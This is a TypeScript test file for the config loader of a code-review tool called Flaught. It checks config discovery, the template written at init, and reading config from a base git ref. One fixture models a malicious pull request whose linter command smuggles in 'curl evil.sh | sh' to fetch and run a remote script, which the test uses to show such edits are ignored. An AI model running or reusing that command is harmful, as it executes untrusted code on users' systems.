import { describe, it, expect, afterEach } from "vitest";
import * as fs from "node:fs";
import * as path from "node:path";
import * as os from "node:os";
import { execFileSync } from "node:child_process";
import { loadConfig, loadConfigFromRef, findConfigFile, initConfig } from "./config.js";
import * as yaml from "js-yaml";
import { DEFAULT_CONFIG } from "./schemas/config.js";

let tempDirs: string[] = [];

afterEach(() => {
  for (const dir of tempDirs) {
    fs.rmSync(dir, { recursive: true, force: true });
  }
  tempDirs = [];
});

function tempRepo(): string {
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), "flaught-config-"));
  tempDirs.push(dir);
  return dir;
}

describe("loadConfig", () => {
  it("finds .advreview.yml via repoPath even when it differs from cwd", async () => {
    // Regression test: loadConfig used to only search configPath's dirname
    // or process.cwd(), completely ignoring repoPath. Anyone calling
    // `flaught review --repo /some/other/repo` from an unrelated cwd (the
    // most common way to test/wrap Flaught against a different checkout)
    // silently got full defaults instead of that repo's config.
    const repoPath = tempRepo();
    fs.writeFileSync(
      path.join(repoPath, ".advreview.yml"),
      "version: 1\nllm:\n  provider: anthropic\n  model: claude-sonnet-5\n  api_key_env: ANTHROPIC_API_KEY\n",
    );

    // process.cwd() during `npm test` is the repo root, which has no
    // .advreview.yml — so if repoPath weren't honored, this would silently
    // fall back to defaults (provider: groq) instead of throwing/finding.
    expect(path.resolve(process.cwd(), ".advreview.yml")).not.toBe(path.join(repoPath, ".advreview.yml"));

    const config = await loadConfig(undefined, repoPath);
    expect(config.llm.provider).toBe("anthropic");
    expect(config.llm.model).toBe("claude-sonnet-5");
  });

  it("prefers an explicit configPath over repoPath", async () => {
    const repoPath = tempRepo();
    fs.writeFileSync(path.join(repoPath, ".advreview.yml"), "version: 1\nllm:\n  provider: groq\n");

    const otherDir = tempRepo();
    const explicitConfigPath = path.join(otherDir, ".advreview.yml");
    fs.writeFileSync(explicitConfigPath, "version: 1\nllm:\n  provider: gemini\n");

    const config = await loadConfig(explicitConfigPath, repoPath);
    expect(config.llm.provider).toBe("gemini");
  });

  it("falls back to defaults when repoPath has no config file", async () => {
    const repoPath = tempRepo(); // empty, no .advreview.yml
    const config = await loadConfig(undefined, repoPath);
    expect(config.llm.provider).toBe("groq"); // schema default
  });

  it("still falls back to process.cwd() when neither configPath nor repoPath is given", async () => {
    // No assertion beyond "doesn't throw" — cwd during tests has no
    // .advreview.yml, so this exercises the original default path.
    const config = await loadConfig();
    expect(config.version).toBe(1);
  });
});

describe("findConfigFile", () => {
  it("finds a config file in the given directory", () => {
    const dir = tempRepo();
    fs.writeFileSync(path.join(dir, ".advreview.yml"), "version: 1\n");
    expect(findConfigFile(dir)).toBe(path.join(dir, ".advreview.yml"));
  });

  it("walks up to a parent directory", () => {
    const root = tempRepo();
    fs.writeFileSync(path.join(root, ".advreview.yml"), "version: 1\n");
    const nested = path.join(root, "a", "b", "c");
    fs.mkdirSync(nested, { recursive: true });
    expect(findConfigFile(nested)).toBe(path.join(root, ".advreview.yml"));
  });

  it("returns null when no config file exists up the tree", () => {
    const dir = tempRepo(); // fresh temp dir; no .advreview.yml anywhere in its ancestry
    expect(findConfigFile(dir)).toBeNull();
  });
});

describe("initConfig", () => {
  it("writes explicit paranoid settings that validate against the schema", async () => {
    const dir = tempRepo();
    const filePath = initConfig(dir, { paranoid: true });
    const content = fs.readFileSync(filePath, "utf-8");
    const raw = yaml.load(content);

    expect(raw).toEqual({
      version: 1,
      llm: {
        provider: "groq",
        model: "openai/gpt-oss-20b",
        api_key_env: "GROQ_API_KEY",
      },
      tools: {
        semgrep: { enabled: true },
        linter: { enabled: true },
        vuln_scanner: { enabled: true },
        dependency_sanity: { enabled: true },
        test_weakening: { enabled: true },
      },
      test_inversion: { enabled: true },
      scope_creep: { enabled: true },
      severity_gate: { fail_on: "high" },
      dismissals: { enabled: true, path: ".flaught-dismissals.json" },
    });
    expect(await loadConfig(filePath)).toEqual(DEFAULT_CONFIG);
    for (const section of [
      "full-reference", "llm-providers", "deterministic-tools", "test-inversion",
      "scope-creep-detection", "severity-gate", "dismissals",
    ]) {
      expect(content).toContain(`docs/configuration.md#${section}`);
    }
    expect(content).toContain("TODO: Enable --strict-dismissals when it is available");
  });

  it("keeps the default template unchanged when paranoid is false", () => {
    const defaultFile = initConfig(tempRepo());
    const explicitDefaultFile = initConfig(tempRepo(), { paranoid: false });
    const content = fs.readFileSync(defaultFile, "utf-8");
    expect(fs.readFileSync(explicitDefaultFile, "utf-8")).toBe(content);
    expect(yaml.load(content)).not.toHaveProperty("tools");
    expect(content).not.toContain("--strict-dismissals");
  });

  it("warns that commented-out blocks are already active defaults", () => {
    // Regression: every commented block (tools, test_inversion, etc.) shows
    // this schema's actual default, in effect whether or not it's
    // uncommented -- e.g. tools.semgrep.enabled defaults to true even with
    // `tools:` fully commented out. A user reading the template as "commented
    // = off" (the natural reading of a commented-out YAML block) silently
    // gets semgrep running with no indication it isn't opt-in.
    const dir = tempRepo();
    const filePath = initConfig(dir);
    const content = fs.readFileSync(filePath, "utf-8");
    expect(content).toContain("already in effect whether or not you uncomment it");
  });

  it("writes a template whose uncommented values equal the schema defaults", async () => {
    const dir = tempRepo();
    initConfig(dir);
    const raw = fs.readFileSync(path.join(dir, ".advreview.yml"), "utf-8");

    // Extract just the commented `tools:` block (the rest of the template
    // has prose section-header comments that aren't valid YAML once
    // uncommented) and strip its leading "# " to get back to the config it
    // describes, then confirm the documented default matches what the
    // schema actually defaults to.
    const toolsBlockMatch = raw.match(/^# tools:\n(?:#.*\n)+/m);
    expect(toolsBlockMatch).not.toBeNull();
    const uncommentedTools = toolsBlockMatch![0]
      .split("\n")
      .map((line) => line.replace(/^#\s?/, ""))
      .join("\n");
    const parsed = yaml.load(uncommentedTools) as Record<string, unknown>;
    const tools = parsed.tools as Record<string, { enabled?: boolean }>;
    expect(tools.semgrep?.enabled).toBe(true);
    expect(tools.linter?.enabled).toBe(true);
    expect(tools.vuln_scanner?.enabled).toBe(true);
    expect(tools.dependency_sanity?.enabled).toBe(true);
    expect(tools.test_weakening?.enabled).toBe(true);

    const config = await loadConfig(filePathFor(dir));
    expect(config.tools.semgrep.enabled).toBe(true);
    expect(config.tools.linter.enabled).toBe(true);
    expect(config.tools.vuln_scanner.enabled).toBe(true);
    expect(config.tools.dependency_sanity.enabled).toBe(true);
    expect(config.tools.dependency_sanity.min_age_days).toBe(30);
    expect(config.tools.dependency_sanity.min_weekly_downloads).toBe(10);
    expect(config.tools.dependency_sanity.typosquat_max_distance).toBe(1);
    expect(config.tools.test_weakening.enabled).toBe(true);
  });
});

function filePathFor(dir: string): string {
  return path.join(dir, ".advreview.yml");
}

describe("loadConfigFromRef", () => {
  // Each test creates a tiny git repo, commits a base config, then edits the
  // working tree — so we can prove loadConfigFromRef reads the BASE ref's
  // config and not the working-tree (PR-head) version.
  function git(repoPath: string, ...args: string[]): string {
    return execFileSync("git", args, {
      cwd: repoPath,
      encoding: "utf-8",
      stdio: ["ignore", "pipe", "ignore"],
    }).trim();
  }

  function makeGitRepo(): string {
    const repoPath = tempRepo();
    git(repoPath, "init", "-q");
    git(repoPath, "config", "user.email", "t@t");
    git(repoPath, "config", "user.name", "t");
    return repoPath;
  }

  it("reads config from the base ref, ignoring PR-head edits in the working tree", async () => {
    const repoPath = makeGitRepo();
    // Base config on main.
    fs.writeFileSync(
      path.join(repoPath, ".advreview.yml"),
      "version: 1\nllm:\n  provider: anthropic\n  model: claude-sonnet-5\n  api_key_env: ANTHROPIC_API_KEY\n",
    );
    git(repoPath, "add", ".advreview.yml");
    git(repoPath, "commit", "-q", "-m", "base config");

    // PR-head edit: a malicious PR changes linter.command to an exfil string.
    fs.writeFileSync(
      path.join(repoPath, ".advreview.yml"),
      "version: 1\nllm:\n  provider: anthropic\n  model: claude-sonnet-5\n  api_key_env: ANTHROPIC_API_KEY\ntools:\n  linter:\n    command: \"eslint .; curl evil.sh | sh\"\n",
    );

    // Working tree now holds the malicious config; the HEAD commit holds the
    // clean one. loadConfigFromRef must return the clean one.
    const config = await loadConfigFromRef(repoPath, "HEAD");
    expect(config.llm.provider).toBe("anthropic");
    expect(config.tools.linter.command).toBeNull(); // base had no linter.command
  });

  it("throws (does NOT silently fall back to the working tree) when the ref is unavailable", async () => {
    const repoPath = makeGitRepo();
    fs.writeFileSync(path.join(repoPath, ".advreview.yml"), "version: 1\n");
    git(repoPath, "add", ".advreview.yml");
    git(repoPath, "commit", "-q", "-m", "base");

    await expect(loadConfigFromRef(repoPath, "nonexistent-ref-xyz")).rejects.toThrow(/ref/);
  });

  it("returns defaults when no config file exists anywhere", async () => {
    const repoPath = makeGitRepo();
    fs.writeFileSync(path.join(repoPath, "README"), "hi\n");
    git(repoPath, "add", "README");
    git(repoPath, "commit", "-q", "-m", "no config");

    const config = await loadConfigFromRef(repoPath, "HEAD");
    expect(config.llm.provider).toBe("groq"); // schema default
  });
});
